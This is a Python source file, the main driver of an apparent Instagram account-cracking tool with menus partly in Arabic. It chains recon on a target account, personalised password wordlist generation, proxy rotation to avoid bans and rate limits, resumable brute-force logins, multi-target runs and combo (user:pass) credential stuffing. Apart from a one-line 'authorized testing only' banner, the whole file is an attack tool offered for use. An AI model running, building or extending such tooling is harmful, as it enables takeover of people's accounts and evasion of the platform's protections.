#!/usr/bin/env python3
import sys
from pathlib import Path
from rich.console import Console
from rich.prompt import Prompt, Confirm

from modules.utils import (
    ensure_dirs, load_config, extract_ig_username,
    parse_targets_file, BASE,
)
from modules.proxy import ProxyPool
from modules.recon import Recon
from modules.passgen import PassGen
from modules.brute import BruteForce
from modules.report import export_html

console = Console()

BANNER = """
[bold cyan]
   ██████╗ █████╗ ███╗   ███╗ ██████╗ ██████╗ ██████╗  ██████╗
  ██╔════╝██╔══██╗████╗ ████║██╔═══██╗██╔══██╗██╔══██╗██╔═══██╗
  ██║     ███████║██╔████╔██║██║   ██║██████╔╝██████╔╝██║   ██║
  ██║     ██╔══██║██║╚██╔╝██║██║   ██║██╔══██╗██╔══██╗██║   ██║
  ╚██████╗██║  ██║██║ ╚═╝ ██║╚██████╔╝██║  ██║██║  ██║╚██████╔╝
   ╚═════╝╚═╝  ╚═╝╚═╝     ╚═╝ ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝
[/bold cyan]
[bold white] OSINT + Smart Wordlist + Brute + Proxy + Resume + Reports[/bold white]
[dim] Linux / Termux | Authorized testing only | v3.0[/dim]
"""


def ask_target() -> str:
    raw = Prompt.ask(
        "[bold cyan]📌 Instagram username أو رابط الحساب[/bold cyan]"
    )
    u = extract_ig_username(raw)
    if not u:
        console.print("[red]Username فاضي[/red]")
        sys.exit(1)
    return u


def get_proxy_pool(cfg: dict) -> ProxyPool:
    pf = cfg.get("proxy_file", "proxies.txt")
    pool = ProxyPool(pf)
    if pool:
        console.print(f"[green][✓] Loaded {len(pool)} proxies from {pf}[/green]")
    else:
        console.print("[yellow][!] No proxies (أنشئ proxies.txt لتفادي الحظر)[/yellow]")
    return pool


def run_recon(username: str, pool: ProxyPool, cfg: dict) -> dict:
    proxies = pool.as_requests() if pool else {}
    r = Recon(username, proxies=proxies, timeout=cfg.get("timeout", 20))
    data = r.gather()
    r.display()
    if data:
        r.export()
        if Confirm.ask("تحميل صورة البروفايل؟", default=True):
            r.download_avatar()
    return data


def run_wordlist(username: str, recon: dict, cfg: dict):
    pg = PassGen()
    info = pg.ask_personal_info(username)
    info = pg.seed_from_recon(info, recon or {}, username)
    count = int(Prompt.ask(
        "عدد كلمات المرور",
        default=str(cfg.get("default_wordlist_size", 18000)),
    ))
    passwords = pg.generate(info, username=username, target=count)
    path = pg.save(passwords, username)
    return passwords, path


def run_brute(username: str, passwords: list, pool: ProxyPool, cfg: dict):
    engine = BruteForce(
        username,
        passwords,
        delay_min=float(cfg.get("delay_min", 3)),
        delay_max=float(cfg.get("delay_max", 5)),
        proxy_pool=pool,
        resume=True,
        rotate_every=int(cfg.get("rotate_proxy_every", 10)),
        rate_sleep=int(cfg.get("rate_limit_sleep", 60)),
    )
    return engine.run(), engine


def main():
    ensure_dirs()
    cfg = load_config()
    console.print(BANNER)
    pool = get_proxy_pool(cfg)

    console.print("[bold yellow]اختر الوضع:[/bold yellow]")
    console.print("  [1] Recon فقط")
    console.print("  [2] توليد Wordlist فقط")
    console.print("  [3] Recon + Wordlist")
    console.print("  [4] Full (Recon + Wordlist + Brute) ⭐")
    console.print("  [5] Brute من wordlist موجودة")
    console.print("  [6] Multi-target من ملف")
    console.print("  [7] Combo attack (user:pass)")
    console.print("  [8] Check username exists")
    console.print("  [9] HTML report من recon محفوظ")

    choice = Prompt.ask("Choice", choices=list("123456789"), default="4")

    # ── 8: exists ──
    if choice == "8":
        u = ask_target()
        ok = Recon(u, proxies=pool.as_requests() if pool else {}).exists()
        console.print(
            f"[green]✅ @{u} موجود[/green]" if ok else f"[red]❌ @{u} غير موجود[/red]"
        )
        return

    # ── 9: report from json ──
    if choice == "9":
        path = Prompt.ask("مسار recon_*.json")
        import json
        data = json.loads(Path(path).read_text(encoding="utf-8"))
        u = data.get("username", "target")
        out = export_html(u, data, 0, {})
        console.print(f"[green][✓] {out}[/green]")
        return

    # ── 6 multi / 7 combo ──
    if choice in {"6", "7"}:
        fpath = Prompt.ask("مسار الملف")
        targets = parse_targets_file(fpath)
        console.print(f"[cyan]Loaded {len(targets)} lines[/cyan]")
        for item in targets:
            u = item["username"]
            console.print(f"\n[bold]==> @{u}[/bold]")
            if choice == "7" and item.get("password"):
                found, _ = run_brute(u, [item["password"]], pool, cfg)
                continue
            # multi: full chain light
            recon = run_recon(u, pool, cfg)
            passwords, _ = run_wordlist(u, recon, cfg)
            if Confirm.ask(f"هاجم @{u}؟", default=False):
                found, eng = run_brute(u, passwords, pool, cfg)
                export_html(u, recon, len(passwords), {
                    "tried": eng.attempts, "rate_hits": eng.rate_hits, "found": found
                })
        return

    # single target flows
    username = ask_target()
    console.print(f"\n[bold green]🎯 Target: @{username}[/bold green]\n")

    recon = {}
    passwords = []
    wl_path = None

    if choice in {"1", "3", "4"}:
        console.print("[bold]═══ PHASE 1: RECON ═══[/bold]")
        recon = run_recon(username, pool, cfg)
        if choice == "1":
            export_html(username, recon, 0, {})
            return

    if choice in {"2", "3", "4"}:
        console.print("\n[bold]═══ PHASE 2: WORDLIST ═══[/bold]")
        passwords, wl_path = run_wordlist(username, recon, cfg)
        if choice in {"2", "3"}:
            export_html(username, recon, len(passwords), {})
            return

    if choice in {"4", "5"}:
        console.print("\n[bold]═══ PHASE 3: BRUTE ═══[/bold]")
        if choice == "5":
            wl_path = Prompt.ask("مسار wordlist")
            passwords = [
                ln.strip()
                for ln in Path(wl_path).read_text(encoding="utf-8", errors="ignore").splitlines()
                if ln.strip()
            ]
        console.print(f"[*] passwords: [green]{len(passwords)}[/green]")
        if not Confirm.ask("بدء الهجوم؟", default=False):
            console.print("[yellow]Cancelled[/yellow]")
            return
        found, eng = run_brute(username, passwords, pool, cfg)
        out = export_html(username, recon, len(passwords), {
            "tried": eng.attempts if eng else 0,
            "rate_hits": eng.rate_hits if eng else 0,
            "found": found,
        })
        console.print(f"[green][✓] HTML report: {out}[/green]")


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        console.print("\n[yellow]Stopped[/yellow]")
        sys.exit(0)
